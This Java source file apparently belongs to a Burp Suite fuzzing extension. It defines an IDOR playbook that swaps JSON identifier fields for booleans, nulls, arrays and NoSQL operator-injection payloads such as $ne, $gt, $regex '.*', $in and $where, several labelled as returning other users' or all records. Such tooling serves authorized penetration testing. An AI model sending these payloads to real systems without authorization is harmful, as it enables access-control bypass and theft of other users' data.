package com.bypassfuzzer.burp.core.idor.playbooks;

import burp.api.montoya.http.message.requests.HttpRequest;
import com.bypassfuzzer.burp.core.idor.IdorRequestContext;
import com.bypassfuzzer.burp.http.LocatedParameter;
import java.util.ArrayList;
import java.util.List;

/**
 * PLAYBOOK: idor.body.unexpected_data_types
 * Change JSON identifier fields into booleans, nulls, arrays, numbers, and operator-like objects.
 */
public class UnexpectedDataTypesPlaybook implements IdorPlaybook {

    @Override
    public String id() {
        return "idor.body.unexpected_data_types";
    }

    @Override
    public String displayName() {
        return "Unexpected Data Types";
    }

    @Override
    public String description() {
        return "Try booleans, nulls, numbers, arrays, and operator-like objects in discovered JSON identifier fields.";
    }

    @Override
    public List<IdorRequestVariant> buildVariants(IdorRequestContext context) {
        if (!context.hasJsonBodyIdentifier()) {
            return List.of();
        }

        HttpRequest targetRequest = context.targetRequest();
        String target = context.targetIdentifier();
        List<IdorRequestVariant> variants = new ArrayList<>();
        for (LocatedParameter parameter : context.bodyIdentifiers()) {
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter, "true", "boolean=true");
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter, "null", "null");
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter, "1", "number=1");
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter, "[true]", "array=[true]");
            JsonBodyPlaybookSupport.addJsonReplacementVariant(
                variants,
                targetRequest,
                parameter,
                "[" + IdorPlaybookSupport.toJsonScalar(target) + ",true]",
                "array=[target,true]"
            );
            // NoSQL operator injection — MongoDB/Mongoose interpret these as
            // query operators when the value reaches a find() or similar.
            String tScalar = IdorPlaybookSupport.toJsonScalar(target);
            String aScalar = IdorPlaybookSupport.toJsonScalar(context.authorizedIdentifier());
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
                "{\"$ne\":" + tScalar + "}", "$ne target");
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
                "{\"$ne\":" + aScalar + "}", "$ne authorized (returns others)");
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
                "{\"$gt\":\"\"}", "$gt empty (all records)");
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
                "{\"$gte\":\"\"}", "$gte empty");
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
                "{\"$regex\":\".*\"}", "$regex match all");
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
                "{\"$regex\":" + tScalar + "}", "$regex target");
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
                "{\"$in\":[" + tScalar + "]}", "$in [target]");
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
                "{\"$in\":[" + tScalar + "," + aScalar + "]}", "$in [target,auth]");
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
                "{\"$nin\":[" + aScalar + "]}", "$nin [auth] (not-in = target)");
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
                "{\"$exists\":true}", "$exists true");
            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
                "{\"$where\":\"1\"}", "$where truthy");
        }
        return variants;
    }

}
